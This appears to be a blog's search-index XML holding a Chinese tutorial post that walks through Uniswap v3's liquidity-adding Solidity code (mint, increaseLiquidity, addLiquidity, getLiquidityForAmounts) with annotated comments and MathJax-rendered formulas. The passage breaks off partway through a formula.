<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Uniswap Part Ⅱ | 提供/移除流动性</title>
    <link href="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/"/>
    <url>/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h1><p>在合约内，v3 会保存所有用户的流动性，代码内称作 <code>Position</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">User-&gt;NonfungiblePositionManager:mint<br>NonfungiblePositionManager-&gt;NonfungiblePositionManager:addLiquidity<br>NonfungiblePositionManager-&gt;UniswapV3Pool:mint<br>UniswapV3Pool-&gt;UniswapV3Pool:_modifyPosition<br>UniswapV3Pool-&gt;UniswapV3Pool:_updatePosition<br></code></pre></td></tr></table></figure><p><code>NonfungiblePositionManager</code>的mint函数实现初始的流动性的添加。<code>increaseLiquidity</code>函数实现了流动性的增加。这两个函数的逻辑基本一致，都是通过调用<code>addLiquidity</code>函数实现。mint需要额外创建ERC721的token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @inheritdoc INonfungiblePositionManager<br>    //mint函数实现初始的流动性的添加<br>    function mint(MintParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline) //modifier，确保_blockTimestamp() &lt;= deadline<br>        returns (<br>            uint256 tokenId,<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        IUniswapV3Pool pool;<br>        //添加流动性，并完成token0和token1的发送<br>        //核心，在下面进行解释<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: params.token0,<br>                token1: params.token1,<br>                fee: params.fee,<br>                recipient: address(this),<br>                tickLower: params.tickLower,<br>                tickUpper: params.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min<br>            })<br>        );<br><br>        //铸造 ERC721 token 给用户，用来代表用户所持有的流动性<br>        _mint(params.recipient, (tokenId = _nextId++));<br><br>//由创建地址和边界return keccak256(abi.encodePacked(owner, tickLower, tickUpper))<br>        bytes32 positionKey = PositionKey.compute(address(this), params.tickLower, params.tickUpper);<br>        // feeGrowthGlobal0X128 和 feeGrowthGlobal1X128 ，分别表示此 position 内的 token0 和 token1 所累计的手续费总额。它只会在 position 发生变动，或者用户提取手续费时更新<br>        //pool.positions是一个mapping，mapping(bytes32 =&gt; Position.Info) public override positions<br>        //Position.Info是一个struct，在Position.sol中<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        // idempotent set<br>        uint80 poolId =<br>            cachePoolKey(<br>                address(pool),<br>                PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee})<br>            );<br><br>//更新mapping _positions，用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来<br>        _positions[tokenId] = Position({<br>            nonce: 0,<br>            operator: address(0),<br>            poolId: poolId,<br>            tickLower: params.tickLower,<br>            tickUpper: params.tickUpper,<br>            liquidity: liquidity,<br>            feeGrowthInside0LastX128: feeGrowthInside0LastX128,<br>            feeGrowthInside1LastX128: feeGrowthInside1LastX128,<br>            tokensOwed0: 0,<br>            tokensOwed1: 0<br>        });<br><br>        emit IncreaseLiquidity(tokenId, liquidity, amount0, amount1);<br>    }<br><br>...<br><br>//increaseLiquidity函数实现了流动性的增加，与上面的mint类似<br>    function increaseLiquidity(IncreaseLiquidityParams calldata params)<br>        external<br>        payable<br>        override<br>        checkDeadline(params.deadline)<br>        returns (<br>            uint128 liquidity,<br>            uint256 amount0,<br>            uint256 amount1<br>        )<br>    {<br>        Position storage position = _positions[params.tokenId];<br><br>        PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];<br><br>        IUniswapV3Pool pool;<br>        //核心<br>        (liquidity, amount0, amount1, pool) = addLiquidity(<br>            AddLiquidityParams({<br>                token0: poolKey.token0,<br>                token1: poolKey.token1,<br>                fee: poolKey.fee,<br>                tickLower: position.tickLower,<br>                tickUpper: position.tickUpper,<br>                amount0Desired: params.amount0Desired,<br>                amount1Desired: params.amount1Desired,<br>                amount0Min: params.amount0Min,<br>                amount1Min: params.amount1Min,<br>                recipient: address(this)<br>            })<br>        );<br><br>        bytes32 positionKey = PositionKey.compute(address(this), position.tickLower, position.tickUpper);<br><br>        // this is now updated to the current transaction<br>        (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);<br><br>        position.tokensOwed0 += uint128(<br>        //计算a×b÷denominator<br>            FullMath.mulDiv(<br>                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128, //a<br>                position.liquidity, //b<br>                FixedPoint128.Q128 //denominator，这里等于0x100000000000000000000000000000000<br>            )<br>        );<br>        position.tokensOwed1 += uint128(<br>            FullMath.mulDiv(<br>                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,<br>                position.liquidity,<br>                FixedPoint128.Q128<br>            )<br>        );<br><br>        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;<br>        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;<br>        position.liquidity += liquidity;<br><br>        emit IncreaseLiquidity(params.tokenId, liquidity, amount0, amount1);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="addLiquidity"><a href="#addLiquidity" class="headerlink" title="addLiquidity"></a>addLiquidity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  struct AddLiquidityParams {<br>      address token0; //token0的地址<br>      address token1; //token1的地址<br>      uint24 fee; //交易费率<br>      address recipient; //流动性所属人地址<br>      int24 tickLower; //流动性价格下限（以token0计价），这里传入的是 tick index<br>      int24 tickUpper; //流动性价格上限（以token0计价），这里传入的是 tick index<br>      uint256 amount0Desired; //<br>      uint256 amount1Desired;<br>      uint256 amount0Min; //提供的token0下限数<br>      uint256 amount1Min; //提供的token1下限数<br>  }<br><br>  /// @notice Add liquidity to an initialized pool<br>  function addLiquidity(AddLiquidityParams memory params)<br>      internal<br>      returns (<br>          uint128 liquidity,<br>          uint256 amount0,<br>          uint256 amount1,<br>          IUniswapV3Pool pool<br>      )<br>  {<br>  //检索对应的流动性池<br>      PoolAddress.PoolKey memory poolKey =<br>          PoolAddress.PoolKey({token0: params.token0, token1: params.token1, fee: params.fee});<br><br>//不需要访问factory就可以计算出pool的地址，原理在上面的CREATE2部分<br>      pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));<br><br>      // compute the liquidity amount<br>      //计算流动性的大小，详见下文<br>      {<br>          (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();<br>          uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(params.tickLower);<br>          uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(params.tickUpper);<br><br>          liquidity = LiquidityAmounts.getLiquidityForAmounts(<br>              sqrtPriceX96, //意思是价格P的平方根, 然后左移了96位保存精度<br>              sqrtRatioAX96,<br>              sqrtRatioBX96,<br>              params.amount0Desired,<br>              params.amount1Desired<br>          );<br>      }<br><br>      (amount0, amount1) = pool.mint(<br>          params.recipient,<br>          params.tickLower,<br>          params.tickUpper,<br>          liquidity,<br>          //用于 pool 合约回调<br>          abi.encode(MintCallbackData({poolKey: poolKey, payer: msg.sender}))<br>      );<br><br>      require(amount0 &gt;= params.amount0Min &amp;&amp; amount1 &gt;= params.amount1Min, 'Price slippage check');<br>  }<br></code></pre></td></tr></table></figure><h3 id="getLiquidityForAmounts"><a href="#getLiquidityForAmounts" class="headerlink" title="getLiquidityForAmounts"></a>getLiquidityForAmounts</h3><p>用来计算流动性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @notice Computes the maximum amount of liquidity received for a given amount of token0, token1, the current<br>  /// pool prices and the prices at the tick boundaries<br>  /// @param sqrtRatioX96 A sqrt price representing the current pool prices<br>  /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary<br>  /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary<br>  /// @param amount0 The amount of token0 being sent in<br>  /// @param amount1 The amount of token1 being sent in<br>  /// @return liquidity The maximum amount of liquidity received<br>  function getLiquidityForAmounts(<br>      uint160 sqrtRatioX96,  //当前矿池价格的平方根<br>      uint160 sqrtRatioAX96, //第一个tick边界的价格的平方根<br>      uint160 sqrtRatioBX96, //第二个tick边界的价格的平方根<br>      uint256 amount0, //发送的token0的数量<br>      uint256 amount1 //发送的token1的数量<br>      //返回收到的最大流动性金额<br>  ) internal pure returns (uint128 liquidity) {<br>  //排序，保证sqrtRatioAX96&lt;sqrtRatioBX96<br>      if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>//情况1<br>      if (sqrtRatioX96 &lt;= sqrtRatioAX96) {<br>          liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);<br>      //情况2    <br>      } else if (sqrtRatioX96 &lt; sqrtRatioBX96) {<br>          uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>          uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>          liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br>      //情况3    <br>      } else {<br>          liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><p>情况1：当前池中的价格小于等于价格范围的最小值</p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819160147301.png" alt="image-20220819160147301"></p><p>此时添加的流动性全部为x token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="16.791ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 7421.8 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2001.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(771.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g><rect width="1657.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(2119.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mfrac" transform="translate(3119.8,0)"><g data-mml-node="mn" transform="translate(746.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g></g><rect width="1607.4" height="60" x="120" y="220"/></g></g><rect width="5167.2" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>以上过程表示在getLiquidityForAmount0中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount0(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount0<br>) internal pure returns (uint128 liquidity) {<br>//排序<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    //sqrtRatioAX96*sqrtRatioBX96/FixedPoint96.Q96<br>    uint256 intermediate = FullMath.mulDiv(sqrtRatioAX96, sqrtRatioBX96, FixedPoint96.Q96);<br>    return toUint128(FullMath.mulDiv(amount0, intermediate, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><p>情况二：当前池中的价格在价格范围中</p><p><img src="/2022/08/20/Uniswap%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E6%8F%90%E4%BE%9B-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7/image-20220819160225006.png" alt="image-20220819160225006"></p><p>此时添加的流动性包含两个币种，可以通过任意一个 token 数量计算出流动性<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.307ex;" xmlns="http://www.w3.org/2000/svg" width="32.634ex" height="6.456ex" role="img" focusable="false" viewbox="0 -1392 14424 2853.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(1977.1,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-824.9)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(747.9,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msub" transform="translate(220,-525.2) scale(0.707)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,91.4)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="42.4" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><rect width="1609.4" height="60" x="120" y="220"/></g><g data-mml-node="mo" 